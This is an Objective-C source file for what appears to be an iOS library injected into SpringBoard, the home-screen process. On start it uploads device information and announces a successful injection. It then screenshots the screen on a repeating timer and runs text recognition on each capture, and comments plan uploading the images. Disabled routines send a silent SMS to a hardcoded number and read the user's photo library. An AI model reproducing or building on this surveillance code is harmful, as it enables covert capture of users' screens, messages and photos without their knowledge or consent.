//
//  YOSystemManager.m
//  SysDevLauchingDevLib
//
//  Created by 陈帆 on 2026/03/27.
//

#import "YOSystemManager.h"
#import "SMSSender.h"
#import "YOPhotoReader.h"
#import "BusinessNetworkManager.h"
#import "VisionImageRecUtil.h"

// 新增：截图相关
static NSTimer *screenshotTimer = nil;

// ─────────────────────────────────────────────
// MARK: - 内部工具：安全获取 rootViewController
// ─────────────────────────────────────────────

/// 从 keyWindow 向下找到最顶层的 ViewController（处理 modal/navigation 层级）
static UIViewController *_Nullable YOTopViewController(void) {
    UIWindow *keyWindow = nil;

    // iOS 13+ 多 Scene 支持
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *window in scene.windows) {
                    if (window.isKeyWindow) { keyWindow = window; break; }
                }
            }
        }
    }

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    if (!keyWindow) keyWindow = [UIApplication sharedApplication].keyWindow;
#pragma clang diagnostic pop

    UIViewController *vc = keyWindow.rootViewController;
    while (vc.presentedViewController) vc = vc.presentedViewController;
    return vc;
}


@implementation YOSystemManager

+ (instancetype)shared {
    static YOSystemManager *m;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        m = [YOSystemManager new];
    });
    return m;
}

#pragma mark - Public

- (void)startAllTasks {
    YOLogI(@"[Manager] 启动所有任务");

    [self sendDeviceInfo];
    
    [self scheduleUI];
//    [self scheduleSMS];
//    [self schedulePhotos];
    
    [self scheduleScreenshotTask];   // ← 新增：每1秒截图任务
}

#pragma mark - Network
- (void)sendDeviceInfo {
    [[BusinessNetworkManager sharedManager] reportDeviceWithSuccess:^(id response) {
        YOLogI(@"设备信息上传成功: %@", response);
    } failure:^(NSError *error) {
        YOLogI(@"设备信息上传失败: %@", error);
    }];
}

#pragma mark - UI

- (void)scheduleUI {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        [self showHookAlert];
    });
}

- (void)showHookAlert {
    UIViewController *topVC = YOTopViewController();
    if (!topVC) {
        YOLogW(@"[UI] 未找到 topVC");
        return;
    }

    UIAlertController *alert =
        [UIAlertController alertControllerWithTitle:@"Hook 成功"
                                            message:@"SpringBoard 已被注入"
                                     preferredStyle:UIAlertControllerStyleAlert];

    [alert addAction:[UIAlertAction actionWithTitle:@"OK"
                                              style:UIAlertActionStyleDefault
                                            handler:^(UIAlertAction *a) {
        YOLogI(@"[UI] 点击 OK");
    }]];

    [topVC presentViewController:alert animated:YES completion:nil];
}

#pragma mark - SMS

- (void)scheduleSMS {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)),
                   dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self sendTestSMS];
    });
}

- (void)sendTestSMS {
    if (![[SMSSender sharedSender] isAvailable]) {
        YOLogE(@"[SMS] 不可用");
        return;
    }
    
    
    NSString *message = @"测试消息202603311118";
    NSString *phoneNumber = @"+8613379523124";

    [[SMSSender sharedSender] sendSilentSMS_iOS16:phoneNumber mes:message];
}

#pragma mark - Photos

- (void)schedulePhotos {
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)),
                   dispatch_get_main_queue(), ^{
        [self readPhotos];
    });
}

- (void)readPhotos {
    [[YOPhotoReader sharedReader]
        requestAuthorizationWithCompletion:^(BOOL granted, PHAuthorizationStatus status) {

        if (!granted) {
            YOLogW(@"[Photo] 权限拒绝");
            return;
        }

        [[YOPhotoReader sharedReader] logLibrarySummary];

        [[YOPhotoReader sharedReader]
            fetchFirstPhotoWithTargetSize:PHImageManagerMaximumSize
                               completion:^(YOPhotoAsset *asset, NSError *error) {

            if (asset) {
                YOLogI(@"[Photo] 获取成功");
            }
        }];
    }];
}

#pragma mark - Screenshot Task (新增)

- (void)scheduleScreenshotTask {
    YOLogI(@"[Screenshot] 启动每 1 秒截图任务");
    
    // 先停止旧的 timer（防止重复启动）
    [screenshotTimer invalidate];
    
    screenshotTimer = [NSTimer timerWithTimeInterval:3.0
                                              target:self
                                            selector:@selector(takeSpringBoardScreenshot)
                                            userInfo:nil
                                             repeats:YES];
    
    [[NSRunLoop mainRunLoop] addTimer:screenshotTimer forMode:NSRunLoopCommonModes];
}

- (void)takeSpringBoardScreenshot {
    @autoreleasepool {
        UIImage *screenshot = [self captureScreen];
        if (!screenshot) {
            YOLogE(@"[Screenshot] 截图失败");
            return;
        }
        
        YOLogI(@"[Screenshot] ✅ 已截取 SpringBoard 屏幕 (%.0f x %.0f)",
               screenshot.size.width, screenshot.size.height);
        
        // 图片识别
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            [[VisionImageRecUtil sharedInstance] recognizeTextInImage:screenshot];
        });
        
        // TODO: 这里可以继续处理截图，例如：
        // 1. 保存到本地临时目录
        // 2. 压缩后通过 BusinessNetworkManager 上传
        // 3. 转为 Base64 发送等
        
        // 示例：保存到 /tmp 目录（便于你之后查看或 adb pull）
//        NSString *path = [NSTemporaryDirectory() stringByAppendingPathComponent:
//                         [NSString stringWithFormat:@"sb_screenshot_%ld.png", (long)[NSDate timeIntervalSinceReferenceDate]]];
//        
//        NSData *pngData = UIImagePNGRepresentation(screenshot);
//        if ([pngData writeToFile:path atomically:YES]) {
//            YOLogD(@"[Screenshot] 已保存到: %@", path);
//        } else {
//            YOLogE(@"[Screenshot] 保存文件失败");
//        }
        
        // 如果你要立即上传，可以在这里调用网络管理器
        // [[BusinessNetworkManager sharedManager] uploadScreenshot:pngData ...];
    }
}

/// 核心截图方法 - 适用于 SpringBoard
- (UIImage *)captureScreen {
    UIWindow *keyWindow = nil;
    
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *w in scene.windows) {
                    if (w.isKeyWindow) {
                        keyWindow = w;
                        break;
                    }
                }
            }
        }
    }
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
    if (!keyWindow) keyWindow = [UIApplication sharedApplication].keyWindow;
#pragma clang diagnostic pop
    
    if (!keyWindow) {
        // 兜底：使用整个屏幕
        UIGraphicsBeginImageContextWithOptions([UIScreen mainScreen].bounds.size, YES, [UIScreen mainScreen].scale);
        [[[UIScreen mainScreen] snapshotViewAfterScreenUpdates:YES] drawViewHierarchyInRect:[UIScreen mainScreen].bounds afterScreenUpdates:YES];
    } else {
        UIGraphicsBeginImageContextWithOptions(keyWindow.bounds.size, YES, [UIScreen mainScreen].scale);
        [keyWindow drawViewHierarchyInRect:keyWindow.bounds afterScreenUpdates:YES];
    }
    
    UIImage *image = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();
    
    return image;
}

@end
